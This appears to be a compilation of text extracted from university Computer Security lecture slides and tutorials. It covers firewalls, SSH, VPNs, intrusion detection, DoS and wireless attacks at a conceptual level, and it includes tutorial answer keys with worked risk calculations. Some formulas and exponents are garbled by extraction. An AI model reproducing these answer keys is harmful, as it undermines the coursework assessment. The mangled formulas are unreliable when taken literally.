Provides forward secrecy using fresh keys for each session.–
Single Sign-On
(SSO) and
Federated
Identity Systems
Single Sign-On (SSO)
Allows users to authenticate once and gain access to
multiple systems.
–
Reduces password fatigue and increases usability.
Types of SSO Systems:
–
Credential manager (CM)1.
Enterprise SSO2.
Federated identity3.
Federated Identity Systems
Enable identity federation across
different domains and organizations.
–
Examples: SAML, OAuth, OpenID
Connect.
–
```

## Lecture 7.pdf

[Lecture 7.pdf](/Users/davidwickerhf/Downloads/Computer Security/Lecture 7.pdf)

```text
Network DefenseFirewalls and Tunnels
BCS2420
Dr. Ashish Sai
ashish.sai@maastrichtuniversity.nl
IntroductionFirewalls and encrypted tunnels (VPNs)
provide perimeter-based defenses.
Firewalls Overview
• Firewalls serve as gateways, controlling access
between networks or devices, isolating damage, and
containing spread using principles like 
Complete-
mediation And Isolated-compartments.
• Often used in perimeter defenses, they protect
trusted internal networks from untrusted external
ones (e.g., the Internet).

Packet-Filter Firewalls
A packet-filter firewall uses rules to
allow or deny data packets based on
header fields. Rules follow a
<condition, action> format, with
actions like ALLOW, DROP, or REJECT.
Stateless vs. Stateful Filters
Stateless Filters: Process each packet
independently.
–
Stateful Filters: Keep track of
connection states, processing packets
based on prior state information.
–
Packet-Filter Rules and Actions
Example Rules
Ingress/Egress Filtering: Rules to prevent spoofed IP
addresses.
1.
SMTP Email: Rules to allow or deny email traffic based on IP
addresses and ports.
2.
HTTP Traffic: Rules to manage outbound and inbound HTTP
connections, using flags like ACK.
3.
DNS Queries: Rules to control DNS traffic for internal and
external queries.
4.
Default-Deny Rulesets
Principle of SAFE-DEFAULTS
A default-deny ruleset blocks all packets
unless explicitly allowed by an accept
rule, reducing the risk of unknown
exploits and aligning with strict security
policies.
Firewall and Security Policy
Firewalls enforce an organization’s
Internet security policy by defining
rules that allow or block packets,
translating authorized services into
specific access controls.
Firewalls as Chokepoints
Firewalls serve as centralized points for monitoring,
control, and packet rejection, assuming a secure perimeter.
Despite the shift from single-point network access, they
remain valuable for:
–
Protecting legacy applications.–
Enforcing security policies against remote threats.–
Supporting defensive strategies like defense-in-depth
and isolation.
–
Limitations of Firewalls
Topological Limitations: Assumes true perimeters exist.1.
Malicious Insiders: Provides little protection against trusted
users cooperating with outsiders.
2.
Bad Connections by Trusted Users: Limited protection
against malicious content from compromised sites.
3.
Tunneling: Firewall rules can be bypassed by tunneling
disallowed protocols.
4.
Encrypted Content: Prevents content-based inspection unless
decrypted at the firewall.
5.
Dynamic Packet Filtering Example:
FTP 
FTP uses separate TCP connections for
commands and data. Dynamic packet
filters track client-specified ports to
temporarily allow inbound connections,
resolving firewall conflicts.
1
FTP (File Transfer Protocol) is a standard network protocol used to transfer files between a client
and server over TCP.
1.
Proxy Firewalls
and Firewall
Architectures
Proxy Firewalls
Act as intermediaries between internal
clients and external services, offering
circuit-level and application-level
filtering.
Circuit-Level Proxies
Relays connections through a proxy
point, allowing or denying the
connection and then relaying data.
SOCKS is a common protocol used.

Application-Level Filters
Uses specialized programs to filter traffic based on
application-specific protocols, capable of altering
payloads for intrusion prevention.
Targeted Applications
Includes widely-used protocols like TELNET, FTP,
HTTP, and email, which are filtered for security
issues.

Bastion Hosts and Dual-Homed Hosts
Bastion Hosts
Exposed to hostile networks and hardened by
disabling non-essential services.
Dual-Homed Hosts
Computers with two network interfaces used as part
of multi-component firewalls to ensure no direct
connections between external and internal networks.
Enterprise Firewall Architectures
Single Screening Router
Basic protection but limited configurability.
Screening Router and Bastion Host
Provides additional security by having a
bastion host behind the router.
DMZ (Demilitarized Zone)
A subnetwork between external and
internal networks, using multiple
screening routers and a bastion host for
added security.

Secure Shell
(SSH)
Secure Shell (SSH)
SSH enables secure, encrypted communication, replacing
insecure protocols like telnet and FTP. It consists of:
Transport Layer: Ensures encryption and integrity.1.
Authentication: Manages client-server
authentication.
2.
Connection: Allows multiple sessions over one
connection.
3.
TARGET FULL NAME FUNCTIONALITY
rsh (ssh) remote shell Send shell commands for execution on remote host by a daemon (rshd).
rlogin
(ssh)
remote login Log in to remote Unix server over TCP network, then communicate as if
physically local.
telnet
(ssh)
teletype network Acquire interactive virtual terminal connection over TCP, e.g., to a
command line interface (Unix, Windows).
ftp (sftp) file transfer prot
(secure ftp)
Transfer files, using separate connections for control and data. Can also
be replaced by ftps (FTP over TLS).
rcp (scp) remote copy
(secure copy)
Copy files, directories between local, remote systems, with command
line syntax similar to Unix command cp

SSH Client Authentication
Methods
Process
Client Password1.
Kerberos Ticket2.
Client Public Key3.
Client sends public key and signature.1.
Server verifies key and signature.2.
SSH Server Authentication
Establishing Trust
Server authentication involves a public key (SSH host
key) verified by the client. Trust models include:
Client Database of Server Keys: Trusted keys
stored locally.
1.
CA-Certified Server Keys: Verified using a CA's
public key.
2.
SSH Port Forwarding
Local Port Forwarding
Redirects data from an unsecured application
through an SSH tunnel.

SCP (Secure Copy)
Functionality
Transfers files securely using SSH
tunnels, replacing rcp.

VPNs and
Encrypted
Tunnels
Motivation
Encrypts data to protect against
eavesdropping and tampering.
Tunneling
Encapsulates one protocol within
another for secure transit.

Virtual Private Networks (VPNs)
A private network using encrypted tunnels over
public networks.
Designs and Use Cases
Transport Mode: Host-to-host VPN for end-to-end
security.
1.
Tunnel Mode: Network-to-network or host-to-
network VPNs for site-to-site or remote access.
2.
```

## Lecture 8.pdf

[Lecture 8.pdf](/Users/davidwickerhf/Downloads/Computer Security/Lecture 8.pdf)

```text
Detecting and
Preventing
Intrusions
BCS2420
Dr. Ashish Sai
ashish.sai@maastrichtuniversity.nl
Intrusion detection , network
monitoring, vulnerability assessment ,
and various network-based attacks.
Intrusion Detection
Firewalls  provide coarse perimeter
shields .
–
Intrusion Detection Systems (IDS) ,
whether host-based  or network-based ,
monitor and analyze for malicious activity
that gets through.
–
Human resources are needed to
manage and explore alarms .
–
Early research in IDS was driven by a
need to automate analysis of audit
trails.
–
Basic Terms
An intrusion  or incident  violates  security
policy, or is an imminent  threat.
–
Intrusion detection  monitors and analyzes
system events to identify and report such
intrusions.
–
An Intrusion Detection System (IDS)
automates this process by monitoring
events , logging data , analysis  and means
to report.
Detection vs. Prevention
An IDS detects intrusions , either in progress or after
the fact, and collects evidence.
–
An Intrusion Prevention System (IPS)  includes active
responses  such as stopping violations  or altering
network configurations .
–
A IPS may operate passively as an IDS.–
A true IPS requires automated real time responses.–
Architectural Types
Type of IDS Source of Events Features
Network-
based IDSs
(NIDS)
Network packets Collected at strategic points like
network gateways.
Host-based
IDSs (HIDS)
Kernel
operations, logs,
file systems
Focuses on a single host; pooling is
needed for a network-wide perspective.
Event Outcomes
• IDS may raise alarms  for processed events,
which may or may not be intrusions.
• Key goals : minimize false positives
(improves usability) and false negatives
(prevents security failures).
Classification Perspective
Intrusion detection involves classifying
events as either intruder behavior  or
legitimate user behavior .
–
There is a tradeoff between false
positives  and negatives .
–
Error Rates
Metric Definition
False Positive Rate (FPR) Ratio of false alarms to events with no intrusions.
False Negative Rate (FNR) Ratio of missed intrusions to total actual intrusions.
True Positive Rate (TPR) Detection rate: correctly identified intrusions out of total intrusions.
Alarm Precision (AP) Ratio of correctly raised alarms to total alarms.

Example: Base Rates
The base rate  of incidence (intrusions) strongly
affects the accuracy of a detector .
–
Even with a low false positive rate , low base rates
may lead to large numbers of false alarms .
–
A useful IDS will both detect intrusions  and
provide good alarm precision .
–
Intrusion
Detection
Methodological Approaches
IDSs combine methods spanning
different approaches.
–
Three philosophical approaches:
signature-based, specification-
based, and anomaly-based .
–
IDS
Approach Alarm When... Pros, Cons, Notes
Signature-
based
Events match known-bad
patterns
Signatures built from known attacks; fast, accurate
(fewer false positives); detects only already-known
attacks
Specification-
based
Events deviate from per-
application specifications
of legitimate actions
Manually developed spec of allowed; can detect new
attacks; no alarm on newly seen allowed event;
specs are protocol or program-specific
Anomaly-
based
Events deviate from
profiles of normal
Need training period to build profiles; can detect
new attacks; false alarms (abnormal may be benign);
accuracy depends on features profiled
Signature-Based Approach
Detects attacks by matching events to predefined
signatures (like anti-virus  or packet filters ).
–
Pros: Fast and accurate.–
Cons: Requires continuous updates and is limited
to known attacks.
–
Behavior-based signatures focus on attack side
effects , not specific implementations.
–

Specification-Based Approach
Defines allowed behaviors for applications or
protocols, raising alarms  for deviations.
–
Pros: Detects new attacks with z ero false
positive s.
–
Cons: Time-intensive to develop and
requires protocol-specific specifications.
–
Anomaly-Based Approach
Creates profiles of normal activity during
training  and detects deviations .
–
Pros: Capable of identifying new attacks .–
Cons: Prone to high false positives ,
difficult feature selection, reliance on
intruder-free training, and session creep.
–
Challenges for Anomaly-Based
Approach
Feature Selection:  Difficult to select effective
features  for profiles.
–
Intruder-free training:  Must ensure no malicious
activity  during training.
–
Session creep:  Profiles should not adapt to malicious
activity  over time.
–
Sniffers, Reconnaissance
Scanners, Vulnerability
Scanners
A collection of tools with both white-hat  and black-hat  uses.–
Packet sniffing : for NIDS , tools to capture and retrieve
packets at line-speed.
–
Also of interest for network monitoring  and forensic analysis .–
Hubs and Switches
Hubs broadcast all packets over all interfaces.–
A NIC in promiscuous mode  can passively  collect
all packets.
–
Switches  send packets only to the target host's
interface.
–
A NIC in promiscuous mode will not get all packets ,
but can be compromised by ARP spoofing .
–

Monitoring Support
SPAN port  (switched port analyzer) or port
mirror duplicates traffic  from other ports.
–
Taps (test access ports) are dedicated
devices facilitating passive monitoring
(inline).
–
Vulnerability Assessment Tools
Specialized intrusion detection tools identifying weaknesses .–
Categories : Known-vulnerable services, configuration errors,
and weak default settings.
–
Purpose : Highlight network vulnerabilities through reports
and self-evaluation.
–
Examples : Reconnaissance tools, vulnerability scanners, and
penetration testing tools .
–
Limitations
Vulnerability assessments are limited to current
exploits  and provide status at a fixed point in time.
–
Dual use of tools creates uneasiness and ethical
concerns.
A responsible disclosure approach is recommended.
–
Port Scanning
Identifies open ports
by sending probes.
–
A port can be open,
closed, or blocked .
–
Detects port scanning
to coordinate with
perimeter defenses
to block.
–
Identifies services
offered on target
hosts and their OS for
vulnerability
exploits .
–
OS Fingerprinting
Example of Nmap  a dual-use network scanner.
Passive  or active  methods that identify a remote
machine's OS and its version.
–
Active methods  send TCP connections or ICMP
requests with non-standard headers.
–
Passive methods  inspect both TCP headers and
application-level HTTP  messages.
–
Vulnerability Scanner Example
Nessus  is a widely used remote vulnerability
scanner, with vast libraries of plugins for
specific vulnerabilities .
–
Can specify scan targets , port ranges , types
of ports , and which plugins to run.
–
Packet Capture Utilities
tcpdump  and Wireshark  are popular tools
for packet capture and processing.
–
Rely on packet capture libraries (e.g.,
libpcap ).
–
Provide user-specified filtering of packets
(e.g., ports, protocols).
–
Denial of Service Attacks
DoS attacks deny legitimate users access  to
resources and services.
–
Two broad categories , those that exploit
implementation flaws  and those that exhaust
resources .
–
DoS attacks are motivated by many factors, from
financial gain  to activism  to experimentation .
–
Distributed Denial of Service (DDoS)
DDoS attacks use a large number of devices across a
wide array of IP addresses to flood a target.
–
Often uses a botnet .–
May use spoofed  IP addresses.–
These can result in a flood of response packets  to the
spoofed address, impacting those not involved with the
initial request.
–

Remote and Local DoS
Local DoS  can result from malware  consuming resources
or triggering kernel flaws .
–
Remote DoS  attacks use n etwork protocols  to trigger
exploits .
–
Example: “Ping of Death”  uses oversized  packets to crash
TCP/IP  implementations.
–
Example: LAND sends a SYN packet with source and
destination being the same value.
–
SYN Flooding
Exploits the TCP handshake , exhausting
server resources.
–
An attacker sends SYN packets , but does not
complete the handshake .
–
Can be amplified using unresponsive  and or
spoofed  addresses.
–
Wireless Networks 
and Security
Background: 802.11 WLAN
Architecture
Ethernet  is a dominant technology for wired LANs ,
standardized as IEEE 802.3 .
–
Wi-Fi and IEEE 802.11  are analogous
technologies/standards for WLANs.
–
Both provide an interface insulating higher layers  from
the details of the data link  and physical layers .
–
Frame Types in 802.11
Data frames : Carry upper-layer data and
authentication messages .
–
Management frames : Related to beacons,
probes, associations, etc.
–
Control frames : Facilitate access to the wireless
medium.
–
WLAN Components
Stations (STAs) : Mobile devices connecting to an access point (AP) via radio
frequencies (RF).
–
Access Point (AP) : Connects to a wired network, providing internet access.–
Authentication Server (AS) : Handles authentication decisions.–
Distribution System (DS) : Facilitates communication between STAs and the wired
network via the AP.
–

Service Set Identifier (SSID)
A WLAN name (up to 32 characters).–
Not a secret and is visible as plaintext in
management frames.
–
Different from a BSSID (AP's MAC
address) or ESSID (ID for an ESS).
–
Infrastructure and Ad Hoc Modes
In infrastructure mode , devices connect to an AP,
which is connected to the wired network.
–
STAs + AP  = basic service set (BSS); multiple BSSs
make an extended service set (ESS).
–
In ad hoc mode , STAs connect directly to each
other without an AP , called an independent basic
service set ( IBSS).
–
Multicast and Broadcast Addresses
A unicast address specifies a single recipient, a
multicast address specifies a group, and broadcast a
LAN.
–
In infrastructure mode, APs send multicast messages;
STAs communicate it with the AP for sending the
message.
–
Broadcast messages use a group key shared by all
devices.
–
Association, Beacons, and Probes
For a device (STA) to connect to an AP, it goes through the
process of:
–
Sending probe messages for information. APs advertise
themselves with periodic beacon frames.
1.
Selecting an AP and starting a low-level authentication
process using a shared key or open system authentication.
2.
Starting the association request sequence.3.
For data frames to be accepted, upper-layer 802.1X must
have been successfully carried out.
4.
AP Security Policy
AP's security policy is specified by elements in
beacons and probes.
–
Includes authentication and encryption options,
and details about the external authentication
server.
–
The STAs choose a suitable security suite for the
connection.
–
WLAN Threats and
Mitigations
Wireless networks have unique vulnerabilities.–
Our interest is in common and recurring error patterns,
using examples of exploited vulnerabilities.
–
The goal is not to analyze specific systems but to
understand the fundamental security flaws in wireless
systems.
–
Wireless Security: Link vs. End-to-
End
Wireless links are not as secure as wired networks.–
A WLAN link is between the STA and the AP, not
end-to-end.
–
Data is decrypted at the AP, and any protection
associated with the wireless link is removed once
received there.
–
Rogue AP Attacks
Exploit the lack of mutual authentication
between STA and AP.
–
The attacker sets up a rogue AP to act as a man-
in-the-middle between a STA and the real AP.
–
Relays messages and credentials with the real
AP.
–

Session Hijacking
Attackers send a disassociate frame to a STA
using the AP's MAC address.
–
The STA de-associates, and the attacker, while
asserting its MAC address, continues the
session with the AP.
–
This is possible without encryption.–
War Driving
Scanning radio channels for in-range wireless
networks.
–
May be used for reconnaissance, or for finding open
networks.
–
Active war driving triggers AP responses using probes.–
NetStumbler is an example of such a tool for wireless
enumeration.
–
Loss of Physical Basis for Threat
Models
With wireless there is no physical restriction to
access and trust is more difficult to assume.
–
Rogue APs are always a concern.–
Shared keys can be used by all users in Wi-Fi
hotspots, leading to greater risk.
–
```

## Tutorial 1 Solution.pdf

[Tutorial 1 Solution.pdf](/Users/davidwickerhf/Downloads/Computer Security/Tutorial 1 Solution.pdf)

```text
1
–
–
–
–
–
–
–
Solution of Lecture 1
Tutroial Sheet - Lecture 1
Computer Security
Part A
1. Which of the following is not one of the fundamental goals
of computer security?
Correct Answer: C. Repudiation
Explanation: The primary, classic goals of computer
security are often summarized as CIA (Confidentiality,
Integrity, Availability). Other important security
properties include authentication, authorization, and
accountability. Repudiation (or its opposite, non-
repudiation) is an important concept but not typically
listed as one of the foundational goals.
2. Which statement best characterizes the principle of
authentication in computer security?
Correct Answer: C. Confirming the identity or genuineness
of an entity or data source
Explanation:
A (Ensuring data are unaltered) is Integrity.
B (Ensuring only authorized users can access resources)
is Authorization.
C (Correct) describes what Authentication actually does
—verifying identity.
D (Guaranteeing system availability) is Availability.
3. Which of the following adversary attributes deals primarily
with the ﬁnancial resources at an attacker’s disposal?
Correct Answer: D. Funding Level
Explanation:
Objectives = attacker goals.
Methods = techniques used.
Capabilities = skill set, knowledge, or computational
power.
2
–
–
–
–
–
–
–
–
Funding Level = amount of money or financial backing
they have, which directly influences the scale of their
operations.
4. In threat modeling, which approach specifically uses a
visual hierarchical structure where the root node is the
overall attack goal and the leaves represent methods to
achieve it?
Correct Answer: B. Attack Trees
Explanation:
Attack Trees start with a top-level goal (root) and
branch out into different possible ways (children
nodes) to achieve that goal.
STRIDE, Diagram-Driven Modeling, and Checklists follow
different methods of enumerating and analyzing threats.
5. In the risk equation , the term  refers to:
Correct Answer: B. The vulnerability level of a system
Explanation:
T = Threat probability
V = Vulnerability (likelihood the threat will succeed
if attempted)
C = Cost (impact if the threat succeeds)
Part B
1. Real-World Incidents
Sample Answer (WannaCry):
Nature of the Attack: WannaCry was a ransomware attack
exploiting a Microsoft Windows vulnerability
(EternalBlue) to spread rapidly across networks. Once
infected, it encrypted user data and demanded Bitcoin
payment for decryption.
Broader Impact: The attack affected over 230,000
computers in more than 150 countries. Organizations
like the UK’s National Health Service (NHS) faced
significant operational disruptions, canceled medical
appointments, and reputational damage. The financial
impact was substantial for organizations needing to
restore systems and manage data recovery.
R=T×V×C V
3
–
–
–
–
Significance: WannaCry underscored how quickly a
ransomware campaign could propagate worldwide and
highlighted the importance of timely patching. It
represented a milestone in global awareness of
ransomware and the vulnerabilities inherent in outdated
systems.
Note: You can apply a similar structured approach if you
chose NotPetya, Stuxnet, or TRITON.
2. Security Policy and Attacks
Key Points:
A security policy defines what is allowed and
disallowed in a system. It includes rules and
guidelines that enforce confidentiality, integrity,
availability, etc.
An attack is a deliberate action intended to violate
the security policy. When an attacker exploits a
vulnerability, they cause a deviation from the secure
state defined by the policy.
Example of Policy: An organization’s policy might state
that only authorized personnel can access sensitive
financial data. A policy violation (e.g., an
unauthorized user gaining access) leads to a non-secure
state where the confidentiality and integrity of that
data are compromised.
Sample Answer:
“A security policy is the formal expression of what
actions are permitted and prohibited on a system. An
attack occurs when an adversary takes steps to force a
violation of these rules, resulting in a non-secure
state. For instance, a company might enforce a policy
that only employees with certain clearance levels can
view customer financial records. If a malicious
outsider (or even an insider without clearance) obtains
access, that violation undermines confidentiality—
moving the system into a non-secure state.”
3. Threat Modeling Methods
4
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
–
Compare: Diagram-Driven vs. STRIDE
Diagram-Driven Modeling
How it Identifies Threats:
You draw detailed architectural diagrams
highlighting system components, data flows, and
trust boundaries.
You ask, “What could go wrong at each boundary
or component?”
Advantages:
Helps visualize complex systems.
Good for discovering unknown issues by walking
through data flows and user actions.
Disadvantages:
Can be time-consuming for large systems.
Quality relies on the accuracy and completeness
of the diagram.
STRIDE
How it Identifies Threats:
1. Uses six predefined threat categories: Spoofing,
Tampering, Repudiation, Information Disclosure,
Denial of Service, Escalation of Privilege.
2. You systematically check each component or data
flow against these categories.
Advantages:
A straightforward mnemonic to ensure common
threat types are not missed.
Particularly useful in brainstorming sessions
and checklists.
Disadvantages:
Might overlook new or unusual threat types not
encapsulated by these six categories.
Less architectural detail than the Diagram-
Driven approach.
4. Insider vs. Outsider Threats
Key Points:
Insiders are individuals with legitimate access (e.g.,
employees, contractors) who can misuse that access.
They often pose a greater risk because they know
internal systems, processes, and vulnerabilities.
Outsiders have to breach perimeter defenses (firewalls,
5
–
–
–
–
–
–
authentication), so they may be more limited initially
but can still launch sophisticated attacks (e.g.,
phishing, malware).
Security Measures:
For insiders: Strict access controls, monitoring and
logging, separation of duties, regular audits.
For outsiders: Firewalls, intrusion detection, strong
external authentication, network segmentation.
Sample Conclusion: “Although both outsiders and insiders
pose serious threats, insiders can be more dangerous due to
their intimate knowledge of the organization’s systems and
data. Therefore, robust internal controls, user access
reviews, and monitoring are crucial in mitigating the risks
posed by individuals already within the network perimeter.”
5. Model-Reality Gaps
Key Points:
Security models can fail when they rely on assumptions
that do not hold in real-world situations (e.g.,
trusting a third-party cloud service to always
implement strong encryption or monitoring).
In a cloud service context, an organization might
assume the cloud provider enforces top-tier security
measures. If the provider’s internal policies or
security settings are weaker than expected, this
mismatch leads to a gap.
Strategy to Mitigate: Regular audits, verifying logs,
third-party penetration tests, and establishing clear
Service-Level Agreements (SLAs) that detail security
responsibilities and requirements.
Sample Answer: “In a cloud service scenario, companies
often assume their data is fully protected by the
provider’s security controls. However, if the cloud
provider does not enforce strong tenant isolation, or if
multi-tenant vulnerabilities exist, attackers could pivot
between different cloud tenants. To mitigate such gaps,
organizations should perform due diligence by reviewing
security certifications of their provider, requesting audit
reports, and conducting periodic penetration tests.”
6
–
–
–
–
–
–
–
–
–
–
–
–
–
–
Part C
1. Applying the Risk Equation
A company’s internal application has:
 (2% probability per year)
 (70% success chance if attacked)
(a) Calculate 
Thus, the annual risk is €70,000.
(b) Discuss two ways to reduce ( R )
1. Technical:
Implement stricter access controls, regular
patching, and advanced intrusion detection systems
to reduce the vulnerability ( V ).
Encrypt sensitive data and limit user privileges to
prevent successful exploitation.
2. Procedural:
Provide employee security awareness training to
lower the chance of successful phishing or social
engineering (this can reduce the effective threat
and/or vulnerability).
Have a solid incident response plan, ensuring quick
detection and recovery to minimize the cost ( C )
of a successful breach (e.g., backups, disaster
recovery).
2. Comparing Security Controls
A university has:
Original values:
Option A: Improves firewalls, reducing  to 0.3
(keeping ).
Option B: Intrusion detection + staff training,
reducing  to 0.02 (keeping ).
Option A: New risk 
 = 
T=0.02
V=0.7
C=€5,000,000
R=T×V×C
R=0.02×0.7×5,000,000
R=0.014×5,000,000
R=€70,000
T=0.1
V=0.8
C=€2,000,000
V
T=0.1
T V=0.8
RA
R=A T×V×newC=0.1×0.3×2,000,000=0.03×
2,000,000€60,000
7
–
–
–
–
Option B: New risk ( R_B ) 
 = 
Which is lower & Recommendation?
Option B yields €32,000 annual risk, which is lower
than Option A at €60,000.
If both options cost the same, Option B appears
more cost-effective since it reduces the overall
risk more significantly. Additionally, improved
staff training has long-term benefits (e.g., fewer
security incidents overall).
R=B T×newV×C=0.02×
0.8×2,000,000=0.016×2,000,000€32,000
```

## Tutorial 1.pdf

[Tutorial 1.pdf](/Users/davidwickerhf/Downloads/Computer Security/Tutorial 1.pdf)

```text
1
Tutorial 1
Fundamentals of Computer Security
Computer Security
BCS2420
Part A
1. Which of the following is not one of the fundamental goals
of computer security?
Confidentiality
Integrity
Repudiation
Availability
2. Which statement best characterizes the principle of
authentication in computer security?
Ensuring data are unaltered except by authorized
parties.
Ensuring only authorized users can access resources.
Confirming the identity or genuineness of an entity
or data source.
Guaranteeing continuous operational readiness of
systems and networks.
3. Which of the following adversary attributes deals primarily
with the financial resources at an attacker’s disposal?
Objectives
Methods
Capabilities
Funding Level
4. In threat modeling, which approach specifically uses a
visual hierarchical structure where the root node is the
overall attack goal and leaves represent methods to achieve
it?
STRIDE
2
–
–
–
–
–
Attack Trees
Diagram-Driven Modeling
Checklists
5. In the risk equation , the term  refers to:
The cost of a successful attack
The vulnerability level of a system
The probability of a threat occurring
The total number of adversaries involved
Part B
1. Real-World Incidents: From the lecture examples (WannaCry,
NotPetya, Stuxnet, TRITON), choose one and discuss:
The nature of the attack (e.g., malware type, exploit
used)
Its broader impact (financial, operational,
reputational)
Why it represents a significant turning point in cyber
threats.
2. Security Policy and Attacks : Describe the relationship
between a security policy and an attack. In your answer,
explain how a policy violation can lead to a non-secure
state and give one example of a practical policy from an
organizational context.
3. Threat Modeling Methods : Compare two different approaches
to threat modeling (e.g., Diagram-Driven vs. STRIDE).
Clearly outline:
How each approach identifies threats
Their advantages and disadvantages for complex systems
4. Insider vs. Outsider Threats : Analyze the security
implications of insiders compared to outsiders. Which
scenario is potentially more dangerous, and how might
security measures differ in addressing the two?
5. Model-Reality Gaps : The lecture discussed how invalid
assumptions can undermine even the best security models.
Give an example of how such a gap might arise in a cloud
service context. Propose one strategy to mitigate this gap.
R=T×V×C V
3
–
–
–
–
–
–
Part C
1. Applying the Risk Equation: A company uses an internal
application that handles critical financial transactions.
Threat probability, : 0.02 (2% chance of occurring
each year)
System vulnerability, : 0.7 (70% chance the attack
will succeed if attempted)
Potential cost of a successful attack, : € 5,000,000
(a) Calculate the annual risk  using the equation: 
(b) Briefly discuss two ways the organization might reduce
 from both the technical and procedural standpoints.
2. Comparing Security Controls: A university estimates that a
successful breach of its research data would cost € 2
million in damages. They can invest in Option A (improved
firewalls) that reduces the system’s vulnerability from 0.8
to 0.3, or Option B (advanced intrusion detection + staff
training) that lowers the threat probability from 0.1 to
0.02.
Threat probability (original): 
Vulnerability (original): 
Potential cost: 
(a). Option A: Calculate the new risk .
(b). Option B: Calculate the new risk .
(c). Which option yields a lower risk? Suppose both options
cost the same. Which would you recommend and why?
T
V
C
R R=T×
V×C
R
T=0.1
V=0.8
C=€2,000,000
RA
RB
```

## Tutorial 2 Solution.pdf

[Tutorial 2 Solution.pdf](/Users/davidwickerhf/Downloads/Computer Security/Tutorial 2 Solution.pdf)

```text
1
–
–
–
–
–
–
Tutorial 2: Solutions
Foundations of Cryptography
Computer Security
BCS2420
Part A
1. Which of the following best describes the advantage of
public-key (asymmetric) encryption compared to symmetric
encryption?
Correct Answer: C. It simplifies secure key distribution
Explanation:
Symmetric encryption often requires a pre-shared key
(both sides must have the same secret key).
Public-key systems allow one to publish a public key
while keeping a private key secret, making key
distribution more convenient.
2. Which cryptographic property ensures that a given hash
output does not reveal any information about the original
message?
Correct Answer: B. One-way property
Explanation:
One-way means it should be infeasible to invert the
hash.
Collision resistance (A) is about finding two inputs
with the same hash.
Second-preimage resistance (D) is about creating a
second input matching an existing hash.
Key encapsulation (C) is unrelated to standard hash
properties.
3. In a chosen-ciphertext attack model, the adversary can...
Correct Answer: B. Submit ciphertexts to a decryption
oracle and observe the results
2
–
–
–
–
–
–
–
–
–
–
–
–
Explanation:
Ciphertext-only: The adversary only sees ciphertext.
Known-plaintext: The adversary knows some
plaintext/ciphertext pairs.
Chosen-plaintext: The adversary can encrypt plaintext
of their choosing.
Chosen-ciphertext: The adversary can decrypt chosen
ciphertexts and analyze responses.
4. Which statement about the Vernam cipher is correct?
Correct Answer: D. It can provide perfect secrecy only if
the key is truly random and used exactly once.
Explanation:
Also known as the one-time pad.
Reusing the key breaks the perfect secrecy property.
5. In a hybrid encryption scheme, typically...
Correct Answer: C. A symmetric key is randomly generated
for data encryption, then encrypted with a public key.
Explanation:
Hybrid encryption uses a symmetric key for efficiency.
This key is then protected (encrypted) with the
recipient’s asymmetric public key.
6. Which of the following is an active adversary action?
Correct Answer: C. Injecting malicious packets into a
conversation
Explanation:
An active adversary modifies or injects data.
A passive adversary only observes or eavesdrops.
7. Collision resistance in a hash function means...
Correct Answer: A. Finding two distinct inputs with the
same hash is computationally infeasible.
Explanation:
“Collision” = different inputs same hash.
Being hard/impractical to find any two inputs with the
same digest is collision resistance.
8. Which block cipher mode directly concatenates each
plaintext block with the preceding ciphertext block (via
XOR) before encryption?
Correct Answer: B. CBC
Explanation:
CBC (Cipher Block Chaining) mode XORs each plaintext
block with the previous block’s ciphertext before
3
–
–
–
–
–
–
–
–
–
encrypting.
ECB (A) encrypts blocks independently; CTR (C) uses
counters; OFB (D) generates keystream blocks.
9. Digital signatures aim to provide which of the following?
Correct Answer: B. Non-repudiation, integrity, and origin
authentication
Explanation:
Digital signatures help prove who signed it (origin
auth), ensure the message is unaltered (integrity), and
prevent the signer from denying having signed (non-
repudiation).
10. A 56-bit key space (as in original DES) implies how many
possible keys?
Correct Answer: A. (2)
Explanation:
A 56-bit key space has (2) possible keys. Other
expressions are incorrect for that bit size.
Part B
1. Comparing Passive vs. Active Adversaries
Passive Adversary: Observes or eavesdrops on
communications without modifying or injecting messages.
Example: A hacker passively sniffing Wi-Fi traffic
to capture data (e.g., passwords).
Active Adversary: Can alter messages in transit, inject
new ones, or impersonate legitimate users.
Example: A man-in-the-middle attack where an
attacker intercepts and modifies messages between
two parties, or an attacker sending forged commands
in a network protocol.
Why more challenging to defend against active
adversaries?
Active adversaries can manipulate data flows, alter
messages, and exploit protocols more dynamically.
This requires not just confidentiality but also
data integrity checks, authentication protocols,
and robust handshake mechanisms.
{56}
{56}
4
–
–
–
–
–
–
–
–
–
–
2. Attack Models
Ciphertext-Only Attack (COA): Adversary only has
ciphertext and attempts to recover plaintext or key.
Known-Plaintext Attack (KPA): Adversary knows some
plaintext/ciphertext pairs and tries to recover the key
or decrypt future ciphertext.
Chosen-Plaintext Attack (CPA): Adversary can choose
plaintexts to be encrypted and sees corresponding
ciphertexts (e.g., can query an encryption oracle).
Chosen-Ciphertext Attack (CCA): Adversary can submit
chosen ciphertexts to a decryption oracle and see the
resulting plaintext.
Strongest Requirement: CCA is generally the most
demanding for a cryptosystem because the adversary can
fully interact with decryption, providing the highest
potential for discovering weaknesses.
3. Key Space and Security
Key Space: All possible keys that can be used by a
cryptographic algorithm. Larger key space → more brute-
force attempts required.
Effect of Increasing Key Length:
Makes brute-force attacks exponentially harder, as each
additional bit doubles the key space.
Other Practical Factors:
1. Implementation robustness: Side-channel leaks or
poor random number generation can reduce effective
security.
2. Speed of encryption/decryption: Slower ciphers can
be costlier to brute force, but also can hinder
legitimate use if too slow.
3. (Bonus) Cryptanalytic breakthroughs: Algorithms
themselves may be broken, reducing effective key
length in practice.
4. Designing a Secure Symmetric Cipher
Core Properties:
1. Confusion (makes relationship between key and
ciphertext complex).
2. Diffusion (spreads plaintext information over many
parts of ciphertext).
3. Large key space + no known structural weaknesses
(e.g., no easy differential or linear
5
–
–
–
–
–
–
–
–
–
–
–
–
cryptanalysis).
Two Advanced Cryptanalytic Methods:
1. Differential Cryptanalysis: Looks at how
differences in plaintext input affect differences
in ciphertext output. A well-designed cipher
incorporates strong non-linear components to resist
this.
2. Linear Cryptanalysis: Exploits statistical biases
in linear combinations of plaintext bits and
ciphertext bits. Substitution-permutation networks
help mitigate these biases.
5. Public-Key Infrastructure (PKI)
Certificates: Signed data structures that bind a public
key to a subject’s identity (e.g., a domain or an
individual). A Certificate Authority (CA) vouches for
correctness by signing.
This relies on the trust placed in the CA.
Use in an Organization:
1. Each employee gets a certificate with their public
key.
2. To send secure email, you retrieve the recipient’s
public key (via their certificate).
3. You encrypt (or sign) email accordingly, trusting
